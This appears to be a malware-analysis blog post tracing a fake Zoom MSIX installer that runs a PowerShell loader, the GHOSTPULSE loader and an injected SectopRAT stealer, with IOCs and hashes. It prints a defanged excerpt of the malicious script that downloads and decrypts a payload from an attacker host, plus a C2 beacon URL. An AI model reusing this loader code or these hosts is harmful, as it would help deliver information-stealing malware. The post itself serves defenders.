---
layout: post
title: SectopRAT Buffet with a side of GHOSTPULSE
date: 2024-05-08 22:00:00 +1030
description: 
image: 
category:
  - Malware Analysis
  - Remote Access Trojan (RAT)
tags:
  - malware_analysis
  - sectoprat
  - ghostpulse
  - msix
  - cybr_culture
  - rat
  - c2
mermaid: true
img_path: /assets/img/
pin: true
---
![Zoom Installer](cyber_rat_tophat_700x300.jpg){: .shadow width="1200" height="630"}

---
## IN THE BEGINNING

Just another day in paradise with a fresh cup of coffee in hand, my Pomodoro clock ticking away 25 minutes, and the diffuser gently releasing its aroma. Fast forward a few and we are now looking at a campaign using signed MSIX App Packages disguised as legitimate installers for popular applications — Zoom Installer, in this case. Unbeknownst to the unsuspecting target, these seemingly innocent MSIX app packages conceal a malicious PowerShell script, setting off the multi-stage stealthy GHOSTPULSE loader, ultimately leading to the injection of a SectopRAT payload, a voracious .NET information stealer (aka ArechClient2), into `MSBuild.exe`{: .filepath}.

As described by MSFT, *"MSIX is a Windows app package format that combines the best features of MSI, .appx, App-V, and ClickOnce to provide a modern and reliable packaging experience"*. In Windows 10 and above, all applications are required to be signed with a valid code signing certificate. Regrettably, cheeky threat actors manage to acquire these certificates, and it's not uncommon for them to be traded in the deepest corners of the web.

Upon double-clicking `Zoom-x64.msix`{: .filepath}, an installation window promptly appears, mirroring the familiar interface of most other installers that users are accustomed to.

![Zoom Installer Window](Zoom-x64_execution.png){: .shadow }
_Zoom Installer Window - MSIX_

Upon the user's selection of `Install`, the latent PowerShell `script 2011_allso.ps1`{: .filepath} springs into action. It promptly initiates an initial GET request to the Command and Control (C2) server, signalling the commencement and concurrently transmitting system information from the compromised device—all cleverly encapsulated within the URL (Antivirus, Domain, Operating System). Without digging into the ins and outs of PSF, the malicious PowerShell script to be executed is defined within `config.json`{: .filepath} that is contained within the MSIX package.

![MSIX config](config_script.png){: .shadow }
_MSIX config.json_

**Example GET Request to the C2 Server:**
```console
hxxps[://]3010cars[.]xyz/?status=start&av=Windows Defender&domain=JUICYPANTS&os=Microsoft+Windows+10
```

## THE LATENT POWERSHELL SCRIPT
Venturing further into the intricacies of the PowerShell script, it becomes evident that the primary goal of `2011_allso.ps1`{: .filepath} is to retrieve a GPG-encrypted file named `robo-claim[.]site/order/allso.tar.gpg`{: .filepath}. Following this, the script decrypts the file and proceeds to execute `TPAutoConnect.exe`{: .filepath}, cunningly disguised as a renamed `vmtoolsd.exe`{: .filepath} binary. This binary, a featured component of the VMware user process, facilitates essential features like copy-paste, drag-and-drop within the VMware environment. A curious observer would also catch the passphrase `putin` being used for decryption.

![PowerShell Script Flow](script_flow.png){: .shadow }
_PowerShell Script Breakout_

**PowerShell Snippet - Retrieiving and Decrypting SectopRAT:**
```powershell
$url = "hxxps[://]robo-claim[.]site/order/allso.tar.gpg"
$outputPath = "$env:APPDATA\$xxx.gpg"
Invoke-WebRequest -Uri $url -OutFile $outputPath
echo 'putin' | .$env:APPDATA\gpg.exe --batch --yes --passphrase-fd 0 --decrypt --output $env:APPDATA\$xxx.rar $env:APPDATA\$xxx.gpg
```

![VMware Digital Signature](vmware_digital_sig.png){: .shadow }
_VMware Digital Signature_

At this stage, it is fair to asses that the `TPAutoConnect.exe (vmtoolsd.exe)`{: .filepath} binary may be being used to perform some form of sideloading. 

## DECRYPTING THE TAR ARCHIVE

Decryption of the TAR file spills the beans - inside, we've got `TPAutoConnect.exe (vmtoolsd.exe)`{: .filepath}, a bunch of DLLs, and the unexpected guest, `fibrolite.dwg`{: .filepath}. Doesn't quite fit the Zoom Installer vibe, right? Now, check out `fibrolite.dwg`{: .filepath} magic numbers – `89 50 4E 47 0D 0A 1A 0A`, initially screaming a .png graphic file. But, hold your horses. When `TPAutoConnect.exe`{: .filepath} takes the stage, it decrypts `fibrolite.dwg`{: .filepath} and pulls off a sneaky move by creating a suspended `MSBuild.exe`{: .filepath} process. This innocent-looking process, though, gets the VIP treatment with a SectopRAT injection. Big shoutout to the folks at [Elastic Security Labs](https://www.elastic.co/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks); they've dissected GHOSTPULSE and its stages like a boss. If you're itching for a deeper dive, their breakdown is a must-read. Everything mentioned here is like the calling card of the same sneaky campaign.

A sanity check of all the .DLL's with Sigcheck we see that digital signature of `glib-2.0.dll`{: .filepath} could not be verified. This could indicate tampering and/or corruption, ultimately the integrity of the DLL is not guaranteed; most likely our sideloading specimen

![Sigcheck](sigcheck.png){: .shadow }
_Sigcheck Signature could not be verified_

## THE JUICE - SECTOPRAT

Using the [Ghost Pulse Payload Extractor](https://github.com/elastic/labs-releases/tree/main/tools/ghostpulse), we are able to extract the payload from the encrypted GHOSTPULSE file.

![Ghostpulse Payload Extractor](ghost_pulse_extractor.png){: .shadow width="1200"}
_Ghostpulse Payload Extractor_

![PEStudio](pe_studio.png){: .shadow width="1200"}
_PEStudio - Ghost Pulse Payload_

Diving into the .NET binary without de-obfuscating, we can clearly see the information stealing capabilities of SectopRAT; scanning for Browsers, Wallets, Accounts, Processes, and files to name a few.

![SectopRAT Scan Critera](scan_details_criteria.png){: .shadow }
_SectopRAT Scan Criteria_

![SectopRAT Scan Arguments](scan_details_args.png){: .shadow }
_SectopRAT Scan Arguments_

When executed the malware creates the suspended child process `MSBuild.exe`{: .filepath}. This process appears to be hollowed out with the SectopRAT payload. A couple of indicators include a hanging `MSBuild.exe`{: .filepath} process with no arguments,  the `Current directory` path of `MSBuild.exe`{: .filepath} being the path the malware was executed from, and by scanning running processes with pe-sieve (developed by @hasherezade), it identified that the PE `MSBuild.exe`{: .filepath} was replaced, reference by the `is_pe_replaced: 1` result. And of course, simply dumping this process and doing analysis would reveal much of what has already been mentioned.

Of note, as part of the encryption process, the environment variable `KKHIECNPOYLCZOXDETZX` is created which points to an encrypted file at `%LOCALAPPDATA%\Temp\232135f6`{: .filepath}

![SectopRAT Scan Arguments](hollow_msbuild.png){: .shadow }
_Possible Process Hollowing of a suspended process_

In this sample, the final payload calls out to `hxxps[:]//pastebin[.]com/raw/cLika3dt`{: .filepath} which contained the C2 address `138.201.125[.]92`{: .filepath}. This C2 was also identified in the network connections upon execution of the malware. along with the string `AfkSystem`. Both indicators indicative of other previously reported SectopRAT samples in the wild.

![Pastebin](pastebin.png){: .shadow }
_C2 Address referenced within Pastebin_

![C2](network_connection.png){: .shadow }
_C2 Network Connections_
  
And lastly, to ensure it lives to fight another day the malware establishes persistence by creating the startup item `Dby_control.lnk`{: .filepath} which points to the original `TPAutoConnect.exe`{: .filepath} mentioned earlier.


---
## OBSERVATIONS

| Context            | Observable                                                                                                       | Indicator Type |
| ------------------ | ---------------------------------------------------------------------------------------------------------------- | -------------- |
| C2 within Pastebin | 138.201.125[.]92:15647                                                                                           | IP-v4          |
| Pastebin           | hxxps[://]pastebin[.]com/raw/cLika3dt                                                                            | URL            |
| PS Script          | 2011_allso.ps1<br>**SHA256:** c6f8edcb9bff1efe62dcaddc90c27df67bf3f64d951a5f08089f2f1c5a7981d1                   | File           |
| Persistence        | %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\Dby_control.lnk                                          | File           |
| Persistence        | TPAutoConnect.exe (vmtoolsd.exe)<br>**SHA256:** bf933ccf86c55fc328e343b55dbf2e8ebd528e8a0a54f8f659cd0d4b4f261f26 | File           |
| SecropRAT          | fibrolite.dwg<br>**SHA256:** f88d3d755ed1d8e79165c74c2c8fc7eefc8df2e909be73adfe3822f65107e5cc                    | File           |
| MSIX               | Zoom-x64.msix<br>**SHA256:** 2ea9ab31124e6639b635ef605473d433b99536d6465e23ab8f0375db35244dce                    | File           |
| Encryped Archive   | allso.tar.gpg<br>**SHA256:** d92178fb77200cabb9a7b36f0b93bcb7f0edd47acaafabca4a420a68f0eefcfd                    | File           |
| Sideload DLL       | glib-2.0.dll<br>**SHA256:** 32ef20dbf95940528359604947d2ed36bc81e2832000ee32af375e0fb3821684                     | File           |





---
### References:

* https://github.com/elastic/labs-releases/tree/main/nightMARE
* https://www.elastic.co/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks